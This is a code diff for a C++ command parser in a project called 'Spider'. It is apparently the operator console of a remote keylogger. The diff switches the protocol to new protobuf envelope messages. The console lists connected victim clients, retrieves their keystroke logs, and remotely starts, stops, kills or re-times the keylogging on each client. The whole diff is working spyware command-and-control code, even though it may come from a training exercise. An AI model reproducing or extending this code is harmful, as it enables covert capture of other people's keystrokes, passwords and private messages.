@@ -11,7 +11,8 @@
 #include <iostream>
 #include <iomanip>
 
-#include "CmdPacket.pb.h"
+#include "SpiderEnvelop.pb.h"
+#include "Commands.pb.h"
 
 namespace Spider {
   class Command {
@@ -20,21 +21,19 @@ namespace Spider {
     {
       this->_parse(command);
     }
-    const spider::RequestPacket &getPacket() const { return _packet; }
+    const SpiderEnveloppe &getPacket() const { return _packet; }
     bool isValid() const { return _isValid; }
 
   private:
-    spider::RequestPacket _packet;
+    SpiderEnveloppe _packet;
     bool _isValid = true;
 
-    // This is pretty much the man page for this CLI
     const std::vector<std::tuple<std::string, std::string, std::string>> _serverCommands = {
       std::make_tuple("list-clients", "", "Get a list of all clients connected to the server."),
-      std::make_tuple("get-log", "<clientUUID | all> [limit]", "Get log for one or all clients. Default limit = 1000 characters"),
+      std::make_tuple("get-log", "<clientUUID> [limit]", "Get log for a client. Default limit = 1000 entries"),
       std::make_tuple("send", "<clientUUID> <method> [argument]", "Send a command to a client. Type \"commands\" for more precisions.")
     };
 
-    // This is pretty much the man page for this CLI
     const std::vector<std::tuple<std::string, std::string, std::string>> _clientCommand = {
       std::make_tuple("start", "", "Start the keylogger if it's idle"),
       std::make_tuple("stop", "", "Pause the keylogger"),
@@ -90,8 +89,9 @@ namespace Spider {
         this->_isValid = false;
         return;
       }
-
-      _packet.set_method(spider::RequestPacket_MethodID_LIST);
+      _packet.set_clientid("0000000000000000");
+      _packet.set_payloadtype("ClientList");
+      _packet.mutable_payload()->PackFrom(ClientList());
     }
 
     void isGetValid(std::vector<std::string> command)
@@ -103,14 +103,17 @@ namespace Spider {
         return;
       }
 
-      _packet.set_method(spider::RequestPacket_MethodID_GET);
-      _packet.set_clientuuid(command[1]);
+      _packet.set_clientid(command[1]);
+      _packet.set_payloadtype("GetClientLog");
+      GetClientLog log;
       if (command.size() >= 3)
-        _packet.set_limit(std::stoi(command[2]));
+        log.set_limit(std::stoi(command[2]));
       else
-        _packet.set_limit(1000);
+        log.set_limit(1000);
+      _packet.mutable_payload()->PackFrom(log);
     }
 
+    // Just check if the function is an existing one and if it contains the right arguments
     bool isSendCommandValid(std::vector<std::string> command)
     {
       if (command.size() < 3 || command.size() > 4)
@@ -139,13 +142,40 @@ namespace Spider {
         this->_isValid = false;
         return;
       }
-      _packet.set_method(spider::RequestPacket_MethodID_SEND);
-      spider::RequestPacket::CmdPacket *toSend = new spider::RequestPacket::CmdPacket();
-      toSend->set_targetuuid(command[1]);
-      toSend->set_name(command[2]);
-      if (command.size() == 4)
-        toSend->set_argument(command[3]);
-      _packet.set_allocated_command(toSend);
+      _packet.set_clientid(command[1]);
+
+      // That's daaaaarty honey, stap it !
+      if (command[2] == "start")
+      {
+        _packet.set_payloadtype("StartKeylogging");
+        StartKeylogging log;
+        _packet.mutable_payload()->PackFrom(log);
+      }
+      else if (command[2] == "stop")
+      {
+        _packet.set_payloadtype("StopKeylogging");
+        StopKeylogging log;
+        _packet.mutable_payload()->PackFrom(log);
+      }
+      else if (command[2] == "kill")
+      {
+        _packet.set_payloadtype("KillClient");
+        KillClient log;
+        _packet.mutable_payload()->PackFrom(log);
+      }
+      else if (command[2] == "status")
+      {
+        _packet.set_payloadtype("ClientStatus");
+        ClientStatus log;
+        _packet.mutable_payload()->PackFrom(log);
+      }
+      else if (command[2] == "delay")
+      {
+        _packet.set_payloadtype("SetClientDelay");
+        SetClientDelay log;
+        log.set_delay(std::atoi(command[3].c_str()));
+        _packet.mutable_payload()->PackFrom(log);
+      }
     }
 
     void _parse(std::string initialCommand)
